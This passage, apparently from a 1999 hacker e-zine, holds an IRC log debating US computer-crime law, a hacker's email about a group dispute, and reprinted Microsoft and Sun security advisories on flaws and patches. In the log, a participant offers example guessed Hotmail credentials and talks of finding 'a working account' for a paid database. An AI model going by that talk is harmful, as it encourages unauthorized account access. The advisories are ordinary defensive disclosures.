+      that, en then will from ther connect to a server in the Netherlands,
+      [04:59] <delam> that's the state of the world with technology
+      [04:59] <Father> Bottom line: (1) authorized access; (2) on computer
+      connected to Interent; (3) where there is "some" connection to U.S. or
+      Inernational seas, air, shops, or the like, equals prosecutable crime in
+      US., even you and computer(s) never step foot on US soil.  Gabish?  Broad
+      statute.
+      [04:59] <Father> Nikkita:  Yep.  You got warrant.
+      [04:59] <Nikkita> father: but I don't do a crime in the Netherlands..
+      [04:59] <delam> authorized access is the key to this issue.. if authorize=
+      d
+      isn't stated and you guess a password and get in.. have you committed a
+      crime?  I'd say no
+      [05:00] <Nikkita> delam: I say no ...
+      [05:00] <Father> So?  Its not Netherlands statute.  Its US statute.
+      [05:00] <Father> Delam:  Guessing password and using it is unauthorized
+      access.
+      [05:00] <Nikkita> Try this for an example at Hotmail...
+      [05:00] <Nikkita> user: john2
+      [05:00] <Nikkita> pass: john
+      [05:00] <Nikkita> user: hank2
+      [05:00] <Nikkita> pass: hank
+      [05:01] <Father> No thanks.
+      [05:01] <feur> father, what about statute interpreation, that without
+      warning banner, there is no unauthorized entry, all entry is fine
+      [05:01] <Nikkita> just by guessing...
+      [05:01] <delam> the problem with internet protocols are taht certain TCP/=
+      IP
+      ports do not have the ability built into the protocol to post a banner..
+      therefore, the issue of "authorized" can never be established by the pers=
+      on
+      running the computer
+      [05:02] <Father> Feur:  Wrong.  That warning banner issue has to do with
+      whether the US government can monitor you without a warrant.
+      [05:02] <feur> or "rights without remedy"
+      [05:02] <delam> if there is a banner on port 23 taht says "you must work
+      here to enter" and a hacker finds port 21 with no banner and enters, even
+      while guessing a passowrd, have they committed a crime?/ the couldn't see
+      any sign that said "keep out"
+      [05:02] <Nikkita> feur: in Scandinavian countries they MUST have fysical
+      saying that you may not enter whitout authoring.
+      [05:03] <Father> Sign that says keep out is not imortatnt.  Sign that say=
+      s
+      come on in is.
+      [05:03] <Father> sorry
+     
+      [05:03] <Father> (Hey, feds are tough.)_
+      [05:03] <delam> how do you establish "authorized access" when a computer =
+      has
+      been connected to a public network without any signs?? I'd say that impli=
+      es
+      it's meant for the public
+      [05:04] <feur> interesting you say that father, my partner is a crimianl
+      attorney in boston, and is defending an elctronic perimeter intrusion
+      [05:04] <Father> Depends on what the purpose of it being connected is.
+      [05:04] <Nikkita> delam: just like sending mail to another country, that
+      packets will travell along dosen systems without asking for permission
+      [05:04] <delam> you're posed with the problem taht you cannot from the
+      outside determine what it's purpose is, but your intent is to enter
+      [05:05] <Father> Who is your partner?
+      [05:05] <Nikkita> partner?
+      [05:06] <Father> Fleur:  who is your partner?
+      [05:06] <Father> Savage?  Silverglate?
+      [05:06] <feur> check your message window
+      [05:06] <delam> it's an interesting debate that I haven't seen any clear =
+      cut
+      legal answers for
+      [05:07] <Nikkita> btw: does anyone know about research in hacks commited =
+      in
+      USA and outside of the USA
+      [05:08] <feur> nikkita, check nexus
+      [05:08] <Nikkita> I have the feeling that it 's easer to hack in the USA,
+      cause the high penalties companies don't do alot of there securityes
+      [05:08] <Nikkita> www.nexus.com?
+      [05:08] <Nikkita> or lexus nexus
+      [05:09] <feur> the db lex nex
+      [05:09] <Father> Time for me to go. Feel free to contact me, agrosso@xxx.org
+      [05:09] <Nikkita> good morning :)
+      [05:09] <dyslexia> thanks Ftaher
+      [05:09] <Nikkita> feur: nexus is a security audit tool like satan
+      [05:09] <dyslexia> Father
+      [05:10] <feur> no, private db lex
+      [05:10] <Nikkita> feur: I'll check on that, just have to find a working
+      account :)
+      [05:13] <Nikkita> to all LoU members still here, don't let that affaire
+      helding you of.
+      [05:13] <Nikkita> You did fine in the past remember that.
+      [05:13] *** Quits: Father (Ping timeout for
+      Father[170.arlington-04.va.dial-access.att.net]=0F)
+      [05:15] <Nikkita> Mark: If your are in Holland in June come and look us u=
+      p
+      [05:15] <Nikkita> Dutch scene will have a 3 day during party
+      [05:16] <Nikkita> CCC, Rop Gongrijp and maybe some L0pth members
+      [05:16] <Nikkita> will be ther
+      [05:18] <feur> ok ladies and gentlemen the marat sade is over tonight,
+      please come back to the asylum
+      [05:20] <Nikkita> feur: good bye
+      [05:20] <Nikkita> sleep tighyt
+      [05:20] *** Quits: Nikkita (Leaving=0F)
+      [05:22] <feur> goodnight mofo nikkita
+      [05:24] *** Quits: feur (irc, where is the wizard of OZ=0F)
+      [05:25] <delam> I'm going to shut the server down in a couple minutes
+      [05:25] <dyslexia> bye all
+      [05:26] *** Quits: dyslexia (Nuke a gay whale for Jesus!=0F)
+      [05:27] *** Disconnected
+      Session Close: Wed Jan 20 05:27:08 1999
+     
+     <snip>
+     --
+     See Ya!
+     RuffNeck
+     ----   ---   --  -
+     ruffneck@xxxxxx.xxx
+     
+     
+      Prior to posting this here I contacted Bronc Buster and he was kind enough
+     to get back to me with some of the inside story on what happened and why.. 
+     this is his message with only slight modifications:
+      
+     Delivered-To: dok-cruciphux@dok.org
+     Date: Fri, 12 Feb 1999 15:02:34 -0500 (EST)
+     From: Bronc Buster <bronc@xxxxxxx.com>
+     To: cruciphux <cruciphux@dok.org>
+     cc: contact@hackernews.com
+     Subject: Re: irc log
+     In-Reply-To: <19990212152545.SUKT27696.mail.rdc1.on.home.com@azazel.n0where.org>
+     Message-ID: <xxx>
+     MIME-Version: 1.0
+     Content-Type: TEXT/PLAIN; charset=US-ASCII
+     
+     
+     I thank you for contacting someone and telling us about this. I'll tell
+     you what this log is, and what it is about. The l00zerz over at Infowar
+     decided they wanted to try and get a peace of the LoU story, so they
+     offered to organize a 'secret' meeting with 'professionals' in the
+     security and intelligance world to offer us advice after the China hacks
+     because it was confermed that the Chinese Govt sent out a memo to some
+     internal security group and told them to 'actively' look for me and
+     Zyklon.
+     
+     Because Winn knows that I know he is nothing but a fake, he tried to
+     exclude me and Zyklon from the meeting altogeather. As you can see from
+     the logs it worked. Once I had been told by other LoU members about it I
+     contacted Winn and Betty asking what this was all about. They said it was
+     nothing and was not going to happen and to not be concerned. 
+     
+     As you can see they conspired with the rest of LoU to exclude me (maybe
+     Zyklon as well) so that they could have this meeting. What they talked
+     about I had no idea until I saw this log. I was told it never took place.
+     
+     It's funny, me and Zyklon were the people in hot water, and we were the
+     ones not included. It's a case of nothing more then the people at Infowar
+     wanting a peace of a big story and getting their grubby hands into this
+     whole mess.
+     
+     I don't want to say anything negative about LoU, so suffice it to say, I
+     am no longer affiliated with LoU in any way, shape or form. 
+     
+     If you want to print any of this in your news letter, or if HNN wants to
+     print any of this you may, with the exception of anything that I may of
+     let slip out about LoU, or any negative comments against LoU. We parted
+     ways, you guys can see the BS that surrounded it..
+     
+     Again, thanks for contacting me
+     
+     regards,
+      Bronc Buster
+
+
+     <snip>
+     
+     'Nuff said on this story I think... thanks to Bronc Buster for clearing 
+     some of this scenario up, and others for advice on 'handling' you know 
+     who you are, also Ruffneck for the log. - Ed
+     
+
+      @HWA
+      
+  5.0 Microsoft advisories
+      ~~~~~~~~~~~~~~~~~~~~
+      [] Back office server 4.0 
+      
+       Approved-By: secnotif@MICROSOFT.COM
+       Date:         Fri, 12 Feb 1999 12:42:57 -0800
+       Sender: Microsoft Product Security Notification Service <MICROSOFT_SECURITY@ANNOUNCE.MICROSOFT.COM>
+       From: Microsoft Product Security <secnotif@MICROSOFT.COM>
+       Subject:      Microsoft Security Bulletin (MS99-005)
+       To: MICROSOFT_SECURITY@ANNOUNCE.MICROSOFT.COM
+       
+       
+       Microsoft Security Bulletin (MS99-005)
+       --------------------------------------
+       
+      >BackOffice Server 4.0 Does Not Delete Installation Setup File
+       
+       Originally Posted: February 12, 1999
+       
+       Summary
+       =======
+      > Microsoft (R) has learned of a potential vulnerability in the installer for
+      > BackOffice Server (R) 4.0. The installer asks the user to provide the
+      > account userid and password for selected services and writes these to a file
+      > in order to automate the installation process. However, the file is not
+      > deleted when the installation process completes. As detailed below,
+      > Microsoft recommends that BackOffice 4.0 customers delete this file.
+       
+       Microsoft has received no reports of customers being adversely affected by
+       this problem. However, it is releasing this security bulletin in order to
+       proactively provide customers with information about the problem in order to
+       allow them to take steps to ensure their safe computing.
+       
+       Issue
+       =====
+       When a user chooses to install SQL Server (R), Exchange Server (R) or
+       Microsoft Transaction Server (R) as part of a BackOffice 4.0 installation,
+       the BackOffice installer program requests the name and password for the
+       accounts associated with these services. Specifically, it asks for the
+       account name and password for the SQL Executive Logon account, the Exchange
+       Services Account, and the MTS Remote Administration Account. These values
+       are stored in <systemdrive>\Program Files\Microsoft Backoffice\Reboot.ini,
+       and used to install the associated services.
+       
+       BackOffice Server does not erase this file when the installation process is
+       completed. This is true regardless of whether the installation process
+       completes successfully or unsuccessfully. By default, the Microsoft
+       BackOffice folder is not shared, so network access to reboot.ini generally
+       does not pose a risk. Users who can log onto the server locally would be
+       able to access the file, but in most cases this ability is granted only to
+       selected users such as administrators.
+       
+       The fix for this problem is to delete the file <systemdrive>\Program
+       Files\Microsoft Backoffice\Reboot.ini after each BackOffice 4.0
+       installation, whether successful or not. The file is created only by the
+       installer, and, once deleted, will not be re-created unless BackOffice 4.0
+       is re-installed.
+       
+       Affected Software Versions
+       ==========================
+       The following software versions are affected:
+       - Microsoft BackOffice Server 4.0
+       
+       What Microsoft is Doing
+       =======================
+       On February 12th, Microsoft sent this security
+       bulletin to customers subscribing to the Microsoft
+       Product Security Notification Service
+       (see http://www.microsoft.com/security/services/bulletin.asp
+       for more information about this free customer service).
+       
+       Microsoft has published the following Knowledge Base (KB) article on this
+       issue:
+       - Microsoft Knowledge Base (KB) article Q217004,
+          BackOffice Installer Tool Does Not Delete Password Cache File.
+          http://support.microsoft.com/support/kb/articles/q217/0/04.asp
+           (Note: It might take 24 hours from the original posting of this
+          bulletin for the KB article to be visible in the Web-based
+          Knowledge Base.)
+       
+       What customers Should Do
+       ========================
+       Microsoft recommends that customers ensure that they delete the file
+       <systemdrive>\Program Files\Microsoft Backoffice\Reboot.ini after the
+       installation program for BackOffice 4.0 completes
+       
+       More Information
+       ================
+       Please see the following references for more information related to this
+       issue.
+       - Microsoft Security Bulletin MS99-005,
+          BackOffice 4.0 Does Not Delete Installation Setup File
+          (the Web-posted version of this bulletin),
+          http://www.microsoft.com/security/bulletins/ms99-005.asp.
+       - Microsoft Knowledge Base (KB) article Q217004,
+          BackOffice Installer Tool Does Not Delete Password Cache File.
+          http://support.microsoft.com/support/kb/articles/q217/0/04.asp
+          (Note: It might take 24 hours from the original posting of this
+          bulletin for the KB article to be visible in the Web-based
+          Knowledge Base.)
+       
+       Obtaining Support on this Issue
+       ===============================
+       If you require technical assistance with this issue, please contact
+       Microsoft Technical Support. For information on contacting Microsoft
+       Technical Support, please see
+       
+http://support.microsoft.com/support/contact/default.asp.
+       
+       Revisions
+       =========
+       - February 12, 1999: Bulletin Created
+       
+       
+       For additional security-related information about Microsoft products, please
+       visit http://www.microsoft.com/security
+       
+       <snip>
+       
+      Approved-By: secnotif@MICROSOFT.COM
+      X-Mailer: Internet Mail Service (5.5.2524.0)
+      Date:         Mon, 8 Feb 1999 15:06:09 -0800
+      Sender: Microsoft Product Security Notification Service <MICROSOFT_SECURITY@ANNOUNCE.MICROSOFT.COM>
+      From: Microsoft Product Security <secnotif@MICROSOFT.COM>
+      Subject:      Microsoft Security Bulletin (MS99-004)
+      To: MICROSOFT_SECURITY@ANNOUNCE.MICROSOFT.COM
+      
+      
+      Microsoft Security Bulletin (MS99-004)
+      --------------------------------------
+      
+      Patch Available for Authentication Processing Error in Windows NT (r) 4.0
+      Service Pack 4
+      
+      Originally Posted: February 8, 1999
+      
+      Summary
+      =======
+   >  Microsoft has released a patch that eliminates a logic error in Service Pack
+   >  4 for Windows NT 4.0 that could, under certain conditions, allow a user to
+   >  log on interactively and connect to network shares using a blank password.
+   >  The vulnerability primarily, but not exclusively, affects Windows NT servers
+   >  that serve as domain controllers in environments with DOS, Windows 3.1,
+   >  Windows for Workgroups, OS/2 or Macintosh clients. In general, customers who
+   >  have deployed only Windows NT, Windows 95 and Windows 98 client workstations
+   >  are not at risk from this vulnerability.
+      
+      A fully supported patch is available for this vulnerability, and Microsoft
+      recommends that all customers evaluate the risk to their systems and, as
+      appropriate, download and install it on affected computers.
+      
+      Issue
+      =====
+      The Windows NT Security Account Manager (SAM) database stores the hashed
+      password for each user account in two forms: an "NT hash" form that is used
+      to authenticate users on Windows NT clients, and an "LM hash" form that is
+      used to authenticate users on Windows 95, Windows 98, and downlevel clients
+      such as DOS, Windows 3.1, Windows for Workgroups, OS/2 and Macintosh. When a
+      user changes his password via a Windows NT, Windows 95 or Windows 98 client,
+      both the "NT hash" and "LM hash" forms of the password are updated in the
+      SAM. However, when the user changes his password via a downlevel client,
+      only the "LM hash" form of the password is stored; a null value is stored in
+      the "NT hash" field. This is normal operation.
+      
+      When a user attempts an interactive logon or a network share connection from
+      a Windows NT system, the Windows NT authentication process uses the "NT
+      hash" form of the password. If the "NT hash" is null, the "LM hash" of the
+      password is used for verification. (Windows 95, Windows 98 and downlevel
+      clients always use only the "LM hash" for verification.) The logic error in
+      Service Pack 4 incorrectly allows a null "NT hash" value to be used for
+      authentication from Windows NT systems. The result is that if a user
+      account's password was last changed from a DOS, Windows 3.1, Windows for
+      Workgroups, OS/2 or Macintosh client, a user can logon into that account
+      from a Windows NT system using a blank password.
+      
+      By far the most likely machines to be affected by this vulnerability would
+      be domain controllers running Windows NT 4.0 SP 4, in networks that contain
+      any of the downlevel clients listed above. However, any server or
+      workstation running Windows NT 4.0 SP 4 that contains a SAM database with
+      active users who communicate from downlevel clients would be vulnerable to
+      this problem. For example, a workgroup of Windows NT 4.0 SP 4 systems, one
+      of which is accessed by Windows for Workgroups clients, would be affected by
+      
+this vulnerability.
+      
+      It is worth reiterating the following points:
+      - Even on an affected network, a user whose most recent
+         password change was performed via Windows NT, Windows 95
+         or Windows 98 workstations will have a non-null "NT hash"
+         value, and hence will not be at risk.
+      - Customers who are affected by the vulnerability need only
+         apply the patch to machines that contain SAM databases
+         with active user accounts.
+      - There is no need for users to update or change their passwords
+         after applying the patch. Even in vulnerable systems, the SAM
+         database entries are valid; the problem lies in the way SP4
+         processes them. The patch corrects the authentication process
+         logic in SP4 without changing the SAM database entries in any way.
+      
+      Affected Software Versions
+      ==========================
+      The following software versions are affected:
+      - Microsoft Windows NT 4.0, Service Pack 4
+      
+      What Microsoft is Doing
+      =======================
+      On February 8th, Microsoft released a patch that fixes the problem
+      identified above. This patch is available for download from the sites listed
+      below.
+      
+      Microsoft has sent this security bulletin to customers subscribing
+      to the Microsoft Product Security Notification Service (see
+      
+http://www.microsoft.com/security/services/bulletin.asp for more
+      information about this free customer service).
+      
+      Microsoft has published the following Knowledge Base (KB) article on this
+      issue:
+      - Microsoft Knowledge Base (KB) article Q214840,
+         MSV1_0 Incorrectly Allows Network Connections for Specific Accounts
+         http://support.microsoft.com/support/kb/articles/q214/8/40.asp
+         (Note: It might take 24 hours from the original posting of this
+         bulletin for the KB article to be visible in the Web-based
+         Knowledge Base.)
+      
+      Microsoft has posted the following hot fixes to address this problem.
+      Please note that the URLs below have been word-wrapped for readability.
+      - Fix for x86 version:
+         ftp://ftp.microsoft.com/bussys/winnt/winnt-public
+         /fixes/usa/NT40/hotfixes-postSP4/Msv1-fix/msv-fixi.exe
+      - Fix for Alpha version:
+         ftp://ftp.microsoft.com/bussys/winnt/winnt-public
+         /fixes/usa/NT40/hotfixes-postSP4/Msv1-fix/msv-fixa.exe
+      
+      What Customers Should Do
+      ========================
+      The patch for this vulnerability is fully supported, and Microsoft
+      recommends that all affected customers apply it. The URLs for the patch are
+      provided above in What Microsoft is Doing.
+      
+      More Information
+      ================
+      Please see the following references for more information related to this
+      issue.
+      - Microsoft Security Bulletin MS99-004,
+         Patch Available for Authentication Processing
+         Error in Windows NT 4.0 Service Pack 4 (the
+         Web-posted version of this bulletin),
+         http://www.microsoft.com/security/bulletins/ms99-004.asp.
+      - Microsoft Knowledge Base (KB) article Q214840,
+         MSV1_0 Incorrectly Allows Network Connections for
+         Specific Accounts.
+         http://support.microsoft.com/support/kb/articles/q214/8/40.asp
+         (Note: It might take 24 hours from the original posting
+         of this bulletin for the KB article to be visible in the
+         Web-based Knowledge Base.)
+      
+
+      Acknowledgements
+      ================
+      Microsoft wishes to acknowledge Harry Johnston, School of Computing and
+      Mathematical Sciences, University of Waikato, New Zealand, for discovering
+      this vulnerability and reporting it to us.
+      
+      Obtaining Support on this Issue
+      ===============================
+      This is a supported patch. If you have problems installing
+      this patch or require technical assistance with this patch,
+      please contact Microsoft Technical Support. For information
+      on contacting Microsoft Technical Support, please see
+      
+http://support.microsoft.com/support/contact/default.asp.
+      
+      Revisions
+      =========
+      - February 8, 1999: Bulletin Created
+      
+      For additional security-related information about Microsoft
+      products, please visit http://www.microsoft.com/security
+      
+      -----------------------------------------------------------
+      
+      THE INFORMATION PROVIDED IN THE MICROSOFT KNOWLEDGE BASE IS PROVIDED "AS IS"
+      WITHOUT WARRANTY OF ANY KIND. MICROSOFT DISCLAIMS ALL WARRANTIES, EITHER
+      EXPRESS OR IMPLIED, INCLUDING THE WARRANTIES OF MERCHANTABILITY AND FITNESS
+      FOR A PARTICULAR PURPOSE. IN NO EVENT SHALL MICROSOFT CORPORATION OR ITS
+      SUPPLIERS BE LIABLE FOR ANY DAMAGES WHATSOEVER INCLUDING DIRECT, INDIRECT,
+      INCIDENTAL, CONSEQUENTIAL, LOSS OF BUSINESS PROFITS OR SPECIAL DAMAGES, EVEN
+      IF MICROSOFT CORPORATION OR ITS SUPPLIERS HAVE BEEN ADVISED OF THE
+      POSSIBILITY OF SUCH DAMAGES. SOME STATES DO NOT ALLOW THE EXCLUSION OR
+      LIMITATION OF LIABILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES SO THE
+      FOREGOING LIMITATION MAY NOT APPLY.
+      
+      (c) 1999 Microsoft Corporation. All rights reserved. Terms of Use.
+      
+         *******************************************************************
+      You have received  this e-mail bulletin as a result  of your registration
+      to  the   Microsoft  Product  Security  Notification   Service.  You  may
+      unsubscribe from this e-mail notification  service at any time by sending
+      an  e-mail  to  MICROSOFT_SECURITY-SIGNOFF-REQUEST@ANNOUNCE.MICROSOFT.COM
+      The subject line and message body are not used in processing the request,
+      and can be anything you like.
+      
+      For  more  information on  the  Microsoft  Security Notification  Service
+      please    visit    http://www.microsoft.com/security/bulletin.htm.    For
+      security-related information  about Microsoft products, please  visit the
+      Microsoft Security Advisor web site at http://www.microsoft.com/security.
+     
+     @HWA
+     
+  5.1  Sun security advisories   
+       ~~~~~~~~~~~~~~~~~~~~~~~ 
+       
+       { Sorry but the excess crap has been left in these advisories to keep the
+       legal people happy. - Ed }
+       
+        Date: Wed, 10 Feb 1999 11:24:01 -0800
+        From: secure@sunsc.Eng.Sun.COM (Sun Security Coordination Team)
+        Message-Id: <199902101924.LAA25198@sunsc.eng.sun.com>
+        To: CWS@sunsc.Eng.Sun.COM
+        X-Sun-Charset: US-ASCII
+        Subject: Sun Security Bulletin #00183
+        
+        -----BEGIN PGP SIGNED MESSAGE-----
+        
+        ________________________________________________________________________________
+        		   Sun Microsystems, Inc. Security Bulletin
+        		
+        Bulletin Number:	#00183
+        Date: 			February 10, 1999
+        
+Cross-Ref:		
+        Title:			sdtcm_convert
+        ________________________________________________________________________________
+        
+        The information contained in this Security Bulletin is provided "AS IS." 
+        Sun makes no warranties of any kind whatsoever with respect to the information 
+        contained in this Security Bulletin. ALL EXPRESS OR IMPLIED CONDITIONS, 
+        REPRESENTATIONS AND WARRANTIES, INCLUDING ANY WARRANTY OF NON-INFRINGEMENT OR 
+        IMPLIED WARRANTY OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE, ARE 
+        HEREBY DISCLAIMED AND EXCLUDED TO THE EXTENT ALLOWED BY APPLICABLE LAW.
+        
+        IN NO EVENT WILL SUN MICROSYSTEMS, INC. BE LIABLE FOR ANY LOST REVENUE, 
+        PROFIT OR DATA, OR FOR DIRECT, SPECIAL, INDIRECT, CONSEQUENTIAL, INCIDENTAL 
+        OR PUNITIVE DAMAGES HOWEVER CAUSED AND REGARDLESS OF ANY THEORY OF LIABILITY 
+        ARISING OUT OF THE USE OF OR INABILITY TO USE THE INFORMATION CONTAINED IN 
+        THIS SECURITY BULLETIN, EVEN IF SUN MICROSYSTEMS, INC. HAS BEEN ADVISED OF 
+        THE POSSIBILITY OF SUCH DAMAGES.
+        
+        If any of the above provisions are held to be in violation of applicable law, 
+        void, or unenforceable in any jurisdiction, then such provisions are waived 
+        to the extent necessary for this disclaimer to be otherwise enforceable in 
+        such jurisdiction.
+        ________________________________________________________________________________
+        
+        1.  Background
+        
+            sdtcm_convert is a setuid-root calendar data conversion utility which
+            converts version 3 (OpenWindows) calendar data format to version 4 
+            (extensible calendar data format), and vice versa. A buffer overflow
+            has been discovered which may be exploited to gain root access.  
+        
+        2.  Affected Supported Versions
+                
+            Solaris(tm) versions:   7, 7_x86, 2.6, 2.6_x86, 2.5.1, 2.5.1_x86, 2.5,
+                                    2.5_x86, 2.4 and 2.4_x86 running CDE
+                           
+        3.  Recommendations
+        
+            Sun recommends that you install the respective patches immediately
+            on affected systems.
+            
+            CDE Version		Patch ID        
+            ___________		_________ 
+            1.3                 107022-01
+            1.3_x86             107023-01
+            1.2                 105566-06
+            1.2_x86             105567-07
+            1.0.2               103670-06
+            1.0.2_x86           103717-06
+            1.0.1               103671-06
+            1.0.1_x86           103718-06
+        
+        _______________________________________________________________________________
+        APPENDICES
+        
+        A.  Patches listed in this bulletin are available to all Sun customers via 
+            World Wide Web at:
+            
+            	<URL:http://sunsolve.sun.com/sunsolve/pubpatches/patches.html>
+        
+        B.  Checksums for the patches listed in this bulletin are available via 
+            World Wide Web at:
+        
+            	<URL:http://sunsolve.sun.com/sunsolve/pubpatches/patches.html>
+        
+        C.  Sun security bulletins are available via World Wide Web at:
+        
+        	<URL:http://sunsolve.sun.com/sunsolve/secbulletins>
+        	
+        D.  Sun Security Coordination Team's PGP key is available via World Wide Web 
+            at:
+        
+        	<URL:http://sunsolve.sun.com/sunsolve/secbulletins/SunSCkey.txt>
+        		    	    	    
+        E.  To report or inquire about a security problem with Sun software, contact 
+            one or more of the following:
+          
+                - Your local Sun answer centers
+                - Your representative computer security response team, such as CERT 
+                - Sun Security Coordination Team. Send email to:
+        	
+             		security-alert@sun.com
+        
+        F.  To receive information or subscribe to our CWS (Customer Warning System) 
+            mailing list, send email to:
+            
+            		security-alert@sun.com
+           
+            with a subject line (not body) containing one of the following commands:
+        
+                Command         Information Returned/Action Taken
+                _______         _________________________________
+        
+                help            An explanation of how to get information
+                
+                key             Sun Security Coordination Team's PGP key
+        	
+                list            A list of current security topics
+        
+                query [topic]   The email is treated as an inquiry and is forwarded to 
+                                the Security Coordination Team
+        
+                report [topic]  The email is treated as a security report and is
+                                forwarded to the Security Coordination Team. Please 
+                                encrypt sensitive mail using Sun Security Coordination
+                                Team's PGP key
+        
+                send topic      A short status summary or bulletin. For example, to 
+                                retrieve a Security Bulletin #00138, supply the 
+                                following in the subject line (not body):
+                		
+                                        send #138
+        
+                subscribe       Sender is added to our mailing list.  To subscribe, 
+                                supply the following in the subject line (not body):
+        
+                                    	subscribe cws your-email-address
+        			
+                                Note that your-email-address should be substituted
+                                by your email address.
+        			
+                unsubscribe     Sender is removed from the CWS mailing list.
+        ________________________________________________________________________________
+        
+        Copyright 1999 Sun Microsystems, Inc. All rights reserved. Sun, 
+        Sun Microsystems, Solaris and SunOS are trademarks or registered trademarks 
+        of Sun Microsystems, Inc. in the United States and other countries. This 
+        Security Bulletin may be reproduced and distributed, provided that this 
+        Security Bulletin is not modified in any way and is attributed to 
+        Sun Microsystems, Inc. and provided that such reproduction and distribution 
+        is performed for non-commercial purposes.
+        
+        
+        
+        -----BEGIN PGP SIGNATURE-----
+        Version: 2.6.2
+        
+        iQCVAwUBNsDNl7dzzzOFBFjJAQHCzAQAgcHETSfA5CrYudnSZues30KRififcbhB
+        FIKBKhAh/Tec7pa0sg9nvTjGPTcTpMPPyj2asxM9KXsxLTKILt8EuoLy3QWdc+qr
+        Tu0pVIcQ/PIBaUXpGMvABS1tVf13tWUIcvZ6yaj08cELV4O6X7K8dbbEXXGfLPtK
+        fSyVXp5ktPo=
+        =B8vf
+        -----END PGP SIGNATURE-----
+        
+        
+        Date: Wed, 10 Feb 1999 12:01:07 -0800
+        From: secure@sunsc.Eng.Sun.COM (Sun Security Coordination Team)
+        Message-Id: <199902102001.MAA25280@sunsc.eng.sun.com>
+        To: CWS@sunsc.Eng.Sun.COM
+        Subject: Sun Security Bulletin #00184
+        X-Sun-Charset: US-ASCII
+        
+        -----BEGIN PGP SIGNED MESSAGE-----
+        
+        ________________________________________________________________________________
+        		   Sun Microsystems, Inc. Security Bulletin
+        		
+        Bulletin Number:	#00184
+        Date: 			February 10, 1999
+        Cross-Ref:		
+        Title:			man/catman
+        ________________________________________________________________________________
+        
+        The information contained in this Security Bulletin is provided "AS IS." 
+        Sun makes no warranties of any kind whatsoever with respect to the information 
+        contained in this Security Bulletin. ALL EXPRESS OR IMPLIED CONDITIONS, 
+        REPRESENTATIONS AND WARRANTIES, INCLUDING ANY WARRANTY OF NON-INFRINGEMENT OR 
+        IMPLIED WARRANTY OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE, ARE 
+        HEREBY DISCLAIMED AND EXCLUDED TO THE EXTENT ALLOWED BY APPLICABLE LAW.
+        
+        IN NO EVENT WILL SUN MICROSYSTEMS, INC. BE LIABLE FOR ANY LOST REVENUE, 
+        PROFIT OR DATA, OR FOR DIRECT, SPECIAL, INDIRECT, CONSEQUENTIAL, INCIDENTAL 
+        OR PUNITIVE DAMAGES HOWEVER CAUSED AND REGARDLESS OF ANY THEORY OF LIABILITY 
+        ARISING OUT OF THE USE OF OR INABILITY TO USE THE INFORMATION CONTAINED IN 
+        THIS SECURITY BULLETIN, EVEN IF SUN MICROSYSTEMS, INC. HAS BEEN ADVISED OF 
+        THE POSSIBILITY OF SUCH DAMAGES.
+        
+        If any of the above provisions are held to be in violation of applicable law, 
+        void, or unenforceable in any jurisdiction, then such provisions are waived 
+        to the extent necessary for this disclaimer to be otherwise enforceable in 
+        such jurisdiction.
+        ________________________________________________________________________________
+        
+        1.  Background
+        
+            The man command displays information from the reference manuals. The
+            catman utility creates preformatted versions of the on-line manuals.
+            Vulnerabilities have been discovered with these commands that may be
+            exploited to overwrite arbitrary files when man or catman is executed
+            by root.
+            
+        2.  Affected Supported Versions
+                
+            Solaris(tm) versions:   7, 7_x86, 2.6, 2.6_x86, 2.5.1, 2.5.1_x86, 2.5,
+                                    2.5_x86, 2.4, 2.4_x86, and 2.3
+                                    
+            SunOS(tm) versions:     4.1.4 and 4.1.3_U1 
+                           
+        3.  Recommendations
+        
+            Sun recommends that you install the respective patches immediately
+            on affected systems.
+            
+            Operating System	Patch ID	
+            _________________   _________    
+            Solaris 7           107038-01		
+            Solaris 7_x86       107039-01
+            Solaris 2.6         106123-04		
+            Solaris 2.6_x86     106124-04
+            Solaris 2.5.1       106905-01
+            Solaris 2.5.1_x86   106906-01
+            Solaris 2.5         106907-01
+            Solaris 2.5_x86     106908-01
+            Solaris 2.4         106912-01
+            Solaris 2.4_x86     106962-01
+            Solaris 2.3         106911-01
+            SunOS   4.1.4	107157-01
+                                107144-01
+            SunOS   4.1.3_U1	107156-01
+                                107143-01
+                                
+        _______________________________________________________________________________
+        APPENDICES
+        
+        A.  Patches listed in this bulletin are available to all Sun customers via 
+            World Wide Web at:
+            
+            	<URL:http://sunsolve.sun.com/sunsolve/pubpatches/patches.html>
+        
+        B.  Checksums for the patches listed in this bulletin are available via 
+            World Wide Web at:
+        
+            	<URL:http://sunsolve.sun.com/sunsolve/pubpatches/patches.html>
+        
+        C.  Sun security bulletins are available via World Wide Web at:
+        
+        	<URL:http://sunsolve.sun.com/sunsolve/secbulletins>
+        	
+        D.  Sun Security Coordination Team's PGP key is available via World Wide Web 
+            at:
+        
+        	<URL:http://sunsolve.sun.com/sunsolve/secbulletins/SunSCkey.txt>
+        		    	    	    
+        E.  To report or inquire about a security problem with Sun software, contact 
+            one or more of the following:
+          
+                - Your local Sun answer centers
+                - Your representative computer security response team, such as CERT 
+                - Sun Security Coordination Team. Send email to:
+        	
+             		security-alert@sun.com
+        
+        F.  To receive information or subscribe to our CWS (Customer Warning System) 
+            mailing list, send email to:
+            
+            		security-alert@sun.com
+           
+            with a subject line (not body) containing one of the following commands:
+        
+                Command         Information Returned/Action Taken
+                _______         _________________________________
+        
+                help            An explanation of how to get information
+                
+                key             Sun Security Coordination Team's PGP key
+        	
+                list            A list of current security topics
+        
+                query [topic]   The email is treated as an inquiry and is forwarded to 
+                                the Security Coordination Team
+        
+                report [topic]  The email is treated as a security report and is
+                                forwarded to the Security Coordination Team. Please 
+                                encrypt sensitive mail using Sun Security Coordination
+                                Team's PGP key
+        
+                send topic      A short status summary or bulletin. For example, to 
+                                retrieve a Security Bulletin #00138, supply the 
+                                following in the subject line (not body):
+                		
+                                        send #138
+        
+                subscribe       Sender is added to our mailing list.  To subscribe, 
+                                supply the following in the subject line (not body):
+        
+                                    	subscribe cws your-email-address
+        			
+                                Note that your-email-address should be substituted
+                                by your email address.
+        			
+                unsubscribe     Sender is removed from the CWS mailing list.
+        ________________________________________________________________________________
+        
+        Copyright 1999 Sun Microsystems, Inc. All rights reserved. Sun, 
+        Sun Microsystems, Solaris and SunOS are trademarks or registered trademarks 
+        of Sun Microsystems, Inc. in the United States and other countries. This 
+        Security Bulletin may be reproduced and distributed, provided that this 
+        Security Bulletin is not modified in any way and is attributed to 
+        Sun Microsystems, Inc. and provided that such reproduction and distribution 
+        is performed for non-commercial purposes.
+        
+        
